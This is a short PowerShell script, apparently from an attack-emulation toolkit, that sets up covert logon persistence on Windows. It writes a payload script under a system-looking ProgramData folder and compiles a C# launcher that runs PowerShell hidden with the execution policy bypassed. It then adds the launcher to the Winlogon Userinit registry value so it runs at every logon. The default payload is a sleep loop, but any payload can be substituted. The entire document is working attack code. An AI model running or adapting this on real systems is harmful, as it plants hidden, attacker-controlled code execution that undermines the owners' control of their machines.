script:
$ps1 = if ($PAYLOAD_PS1) { $PAYLOAD_PS1 } else { 'C:\ProgramData\Subsystems\winitupd.ps1' }
$exe = if ($PAYLOAD_EXE) { $PAYLOAD_EXE } else { 'C:\ProgramData\Subsystems\winitupd.exe' }
$dir = Split-Path $exe -Parent
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$body = if ($PAYLOAD_BODY) { $PAYLOAD_BODY } else { 'while ($true) { Start-Sleep -Seconds 300 }' }
Set-Content -Path $ps1 -Value $body -Encoding ascii
$cls = 'WinitUpd'
$src = @'
using System;
using System.Diagnostics;
public class WinitUpd {
    public static void Main() {
        try {
            Process.Start(new ProcessStartInfo {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"__PS1__\"",
                UseShellExecute = false,
                CreateNoWindow = true });
        } catch (Exception) {}
    }
}
'@
$src = $src.Replace('__PS1__', $ps1.Replace('\', '/'))
$cs = Join-Path $dir ($cls + '.cs')
Set-Content -Path $cs -Value $src -Encoding ascii
& C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:exe /out:$exe $cs | Out-Null
if (-not (Test-Path $exe)) { throw 'winitupd compilation failed' }
$k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', $true)
$cur = [string]$k.GetValue('Userinit', 'C:\Windows\system32\userinit.exe,')
if ($cur -notlike "*$exe*") { $k.SetValue('Userinit', ($cur.TrimEnd() + ' ' + $exe), 'String') }
$k.Close()
Write-Output 'Userinit extended'
